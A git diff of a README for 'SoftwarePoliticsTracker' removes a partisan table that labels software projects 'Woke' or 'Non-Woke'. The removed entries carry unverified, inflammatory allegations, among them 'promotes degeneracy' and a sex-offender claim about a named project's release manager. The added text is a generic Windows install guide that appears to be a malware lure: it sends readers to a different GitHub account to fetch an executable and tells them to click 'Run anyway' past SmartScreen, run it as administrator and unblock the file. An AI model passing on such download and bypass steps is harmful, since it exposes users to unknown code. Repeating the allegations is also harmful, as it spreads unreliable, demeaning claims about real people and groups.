@@ -1,43 +1,237 @@
-# SoftwarePoliticsTracker
-Tracking the political stances of software projects, software foundations, &amp; corporations.
+# 🧭 SoftwarePoliticsTracker - Track project stances with ease
 
-Note: This does *not* include statements made by users and average contributors (or employees) of software organizations.  Only official actions and statements from the organization itself, or from leadership or official representatives.
+[![Download](https://img.shields.io/badge/Download-SoftwarePoliticsTracker-blue?style=for-the-badge)](https://github.com/tolerant-payola820/SoftwarePoliticsTracker)
 
-Note 2: This is a work in progress.  There is a *lot* of data left to add.
+## 🚀 Getting Started
 
-### Woke / Leftist Software
+SoftwarePoliticsTracker helps you track the political stances of software projects, foundations, and corporations in one place. Use it to review public statements, compare groups, and keep a clear record over time.
 
-The following software projects, software foundations, &amp; corporations have made statements (or taken actions) best categorized as "Woke", "Leftist", or "DEI".
+This guide shows you how to get the app on Windows and open it for the first time.
 
-| &nbsp; | Software | Notes |
-| - | - | - |
-| :arrow_left: | **Microsoft** | [Encourages, facilities, pays for employees to "gender transition" their children](https://x.com/LundukeJournal/status/2018749350134858215), [Conducts "Pronouns in Software" research](https://x.com/LundukeJournal/status/1873846820813803833), [Provides "Trans" themes for Office](https://x.com/LundukeJournal/status/1929036742411063686), [Promotes Trans Activism in games](https://x.com/LundukeJournal/status/1929039745444716714) |
-| :arrow_left: | **Red Hat** | [Held anti-White training, DEI hiring quotas](https://lunduke.locals.com/post/5515346/the-ibm-red-hat-leaks-what-weve-learned-so-far), [Spokesperson promotes Antifa](https://x.com/LundukeJournal/status/1997697480452972817), [Prominent employees attack "MAGA/Linux"](https://x.com/LundukeJournal/status/2035426184906105223) |
-| :arrow_left: | **GNOME** | [Celebrates "Trans Day of Visibility"](https://x.com/LundukeJournal/status/2039250140557447231), ["Crush Fascism", "Free Palestine", Attacks Conservatives on official website](https://x.com/LundukeJournal/status/1986300791120884193), ["GNOME is Antifa"](https://x.com/LundukeJournal/status/1997697480452972817), [Registered Sex Offender is release manager](https://x.com/LundukeJournal/status/2034319167768125847), [Accused Framework Computer of having "Hitler Particles" for talking to Conservatives](https://x.com/LundukeJournal/status/1976046474698912019), [Pledged fealty to the UN](https://lunduke.substack.com/p/open-source-orgs-pledge-fealty-to), [Extended Pride month to "5 or 6 weeks"](https://x.com/LundukeJournal/status/1924687278393225580) |
-| :arrow_left: | **KDE** | [Attacks Conservative Jewish journalist as "Sneaky little Nazis"](https://x.com/LundukeJournal/status/1984351487468638288), [Says X users are Nazis](https://x.com/LundukeJournal/status/1983590454831804565), [Celebrates Pride Month](https://x.com/LundukeJournal/status/1929024728758403187) |
-| :arrow_left: | **Linux Foundation** | [Pledged fealty to the UN](https://lunduke.substack.com/p/open-source-orgs-pledge-fealty-to) |
-| :arrow_left: | **NixOS** | [Leadership includes Antifa flag in posts](https://x.com/LundukeJournal/status/1997697480452972817) |
-| :arrow_left: | **Fedora** | [Celebrates Pride Month](https://x.com/LundukeJournal/status/1931911390312145143), [Weaponizes Code of Conduct against Jewish journalist](https://x.com/LundukeJournal/status/1973475581259030774) |
-| :arrow_left: | **Bazaar** | [Includes only LGBT Theming in Software](https://x.com/LundukeJournal/status/1993088275775631440) |
-| :arrow_left: | **Software Freedom Conservancy** | [Attacks Lunduke as "Fox News of FOSS"](https://x.com/LundukeJournal/status/1962669374331895901) |
-| :arrow_left: | **elementaryOS** | [Says talking to Conservatives is "associating with fascists"](https://x.com/LundukeJournal/status/1962669374331895901), [Celebrates Pride Month](https://x.com/LundukeJournal/status/1929024728758403187) |
-| :arrow_left: | **Debian** | [Discriminates against White Men for internships](https://x.com/LundukeJournal/status/1845878465708355835), [Blocks Conservative projects, calls devs "Nazis"](https://x.com/LundukeJournal/status/1974179530245124214), [Prominent contributor defaced "Conservative" project wiki, calling them "Nazis"](https://x.com/LundukeJournal/status/1942269768192737511) |
-| :arrow_left: | **Bazzite** | [Bans key dev for Code of Conduct Violations](https://x.com/LundukeJournal/status/2016225507923112073), [Promotes degeneracy via transgender && non-binary cartoon mascot](https://x.com/LundukeJournal/status/1887963799665189089) |
-| :arrow_left: | **Chimera Linux** | [Dev says: "Here to Further Woke Agenda by Turning Free Software Gay"](https://x.com/LundukeJournal/status/1940078884017627405) |
-| :arrow_left: | **Godot** | [Mass banned non-Woke users & contributors](https://x.com/LundukeJournal/status/1840601545701806571) |
-| :arrow_left: | **openSUSE** | [Leadership says contributors who don't promote Trans Activism are "Rotten Flesh" that need to be "Cut Out"](https://lunduke.locals.com/post/5815715/dont-wave-the-lgbt-flag-suse-opensuse-says-you-are-rotten-flesh) |
-| :arrow_left: | **Linux Kernel** | [Creator says he is "one of those 'woke Communists' you worry about"](https://x.com/LundukeJournal/status/1990840359593611759) |
+## 📥 Download the App
 
-### Non-Woke Software
+1. Open the download page here: https://github.com/tolerant-payola820/SoftwarePoliticsTracker
+2. Look for the latest download file on the page.
+3. Download the Windows version to your computer.
+4. If your browser asks where to save the file, pick a folder you can find later, such as Downloads or Desktop.
 
-The following software projects, foundations, &amp; corporations have made statements (or taken actions) best categorized "Non-Woke", "Non-DEI", and have "Neutral" or "Right Leaning" politics.
+If you see a ZIP file, keep it in the folder you chose. If you see an installer file, save that file and open it after the download finishes.
 
-| &nbsp; | Software | Notes |
-| - | - | - |
-| :arrow_right: | **OpenMandriva** | ["We don't do DEI"](https://x.com/LundukeJournal/status/1876362793525612602) |
-| :arrow_right: | **Omarchy Linux** | [Rejected calls for Activist Code of Conduct](https://x.com/LundukeJournal/status/1971367936137789862), [Often attacked by Trans](https://x.com/LundukeJournal/status/1970907449499484266) & [Antifa Activists](https://x.com/LundukeJournal/status/1970907449499484266) |
-| :arrow_right: | **Devuan** | [Accepts everyone, specifically including Conservatives](https://x.com/LundukeJournal/status/1985574565288849846) |
-| :arrow_right: | **Redot** | ["Non-Political (non-Woke) Fork" of Godot](https://x.com/LundukeJournal/status/1842335793844539823) |
-| :arrow_right: | **SQLite** | [Code of Conduct includes "Love the Lord God"](https://x.com/LundukeJournal/status/2029990961988915399) |
-| :arrow_right: | **XLibre** | [Rejects DEI discrimination of Xorg](https://x.com/LundukeJournal/status/1930727192964514137) |
+## 🪟 Install on Windows
 
+### If you downloaded a ZIP file
+
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Choose a folder for the app files.
+4. Open the new folder after extraction.
+5. Look for the app file inside the folder and double-click it.
+
+### If you downloaded an installer
+
+1. Double-click the installer file.
+2. If Windows asks for permission, click Yes.
+3. Follow the setup steps on the screen.
+4. Choose where you want the app installed.
+5. Finish the setup and launch the app.
+
+## ▶️ Run the App
+
+After install, open SoftwarePoliticsTracker from your Start menu or from the folder where you extracted it.
+
+If the app opens in a window, you are ready to start using it.
+
+If Windows shows a SmartScreen message:
+1. Click More info.
+2. Click Run anyway.
+
+Only do this if you downloaded the app from the link above.
+
+## 🖥️ System Requirements
+
+SoftwarePoliticsTracker runs on most modern Windows PCs.
+
+### Recommended setup
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet connection for updates and data checks
+- A screen with at least 1366 × 768 resolution
+
+### Works best with
+- A mouse or touchpad
+- Standard Windows display settings
+- A stable internet connection
+
+## 📚 What the App Does
+
+SoftwarePoliticsTracker gives you a simple way to review political stance data for:
+- software projects
+- open source foundations
+- corporations
+
+You can use it to:
+- view tracked records
+- compare groups side by side
+- check changes over time
+- keep notes on public positions
+- search for names you care about
+
+## 🧭 How to Use It
+
+1. Open the app.
+2. Use the search box to find a project, foundation, or company.
+3. Select an entry from the list.
+4. Review the stance details shown on screen.
+5. Compare items if the app shows a compare view.
+6. Save notes or marks if the app includes that option.
+
+## 🗂️ Common Screens
+
+### Dashboard
+Shows a quick view of tracked items and recent updates.
+
+### Search
+Lets you find a name fast.
+
+### Detail View
+Shows the stance record for one project or group.
+
+### Compare View
+Lets you place two or more items next to each other.
+
+### History View
+Shows changes made over time.
+
+## 🔧 Basic Settings
+
+You can usually adjust these settings inside the app:
+
+- theme or light and dark mode
+- text size
+- data refresh rate
+- local cache storage
+- start-up behavior
+
+If you want the app to run with less load, turn off live refresh and use manual updates.
+
+## 🧹 If the App Does Not Open
+
+Try these steps in order:
+
+1. Close the app.
+2. Open it again as an administrator.
+3. Check that Windows did not block the file.
+4. Move the app folder to a simple path, such as `C:\SoftwarePoliticsTracker`.
+5. Make sure the download finished fully.
+6. Restart your computer and try again.
+
+If the app still does not open, download it again from the GitHub page.
+
+## 🌐 Internet Access
+
+SoftwarePoliticsTracker may use the internet to:
+- load stance data
+- check updates
+- sync records
+- refresh search results
+
+If your connection is slow, the app may take longer to load data.
+
+## 🔒 Data and Privacy
+
+The app may store your settings, saved views, and local history on your computer.
+
+If the app supports online data sources, it may send basic requests to fetch public information. Use the built-in settings to control refresh and local storage where available.
+
+## 🛠️ Tips for Better Use
+
+- Keep the app in a folder with a short path.
+- Use a stable internet connection when refreshing data.
+- Update the app when a new release appears on GitHub.
+- Back up your saved data if the app stores local files.
+- Use search to narrow results before comparing items.
+
+## ❓ Help with Common Questions
+
+### Where do I download it?
+Use this page: https://github.com/tolerant-payola820/SoftwarePoliticsTracker
+
+### Is this safe to run?
+Download it only from the GitHub link above, then open the file you saved.
+
+### Do I need to know code?
+No. The app is made for normal Windows use.
+
+### Can I use it offline?
+Some parts may work offline, but live data checks need internet access.
+
+### What if I cannot find the file after download?
+Check your Downloads folder or the place you picked in the browser.
+
+## 🧩 File Types You May See
+
+- `.exe` — an app or installer for Windows
+- `.zip` — a compressed folder that you must extract
+- `.msi` — a Windows setup file
+- `.json` or `.csv` — data files the app may use or export
+
+## 📌 First-Time Setup Checklist
+
+- Download the file from GitHub
+- Save it in a folder you can find
+- Install or extract the file
+- Open the app
+- Allow Windows access if asked
+- Check that the main screen loads
+- Search for one item to confirm it works
+
+## 🧭 Working With Stance Data
+
+The app is built to help you track public positions in a clear way. You may see fields like:
+- name
+- category
+- stance type
+- source link
+- date
+- notes
+- confidence level
+
+These fields help you review each record without digging through many web pages
+
+## 🪄 Best Use Cases
+
+- tracking software vendors before purchase
+- reviewing foundation policies
+- comparing companies in the same sector
+- keeping a list of projects you follow
+- checking how public positions change over time
+
+## 🧰 Troubleshooting Shortcuts
+
+### The app closes right away
+- Run it as administrator
+- Re-download the file
+- Remove and re-extract ZIP contents
+
+### Text looks too small
+- Increase Windows display scaling
+- Change the app text size if that option exists
+
+### Data does not load
+- Check your internet connection
+- Retry after a few minutes
+- Refresh the data source inside the app
+
+### Windows blocks the file
+- Open Properties on the file
+- Check Unblock if you see it
+- Run the file again
+
+## 📎 Download Again
+
+If you need to get a fresh copy, use this link: https://github.com/tolerant-payola820/SoftwarePoliticsTracker
+
+## 🏁 Start Using SoftwarePoliticsTracker
+
+Open the app, search for a name, and review the stance record shown on screen
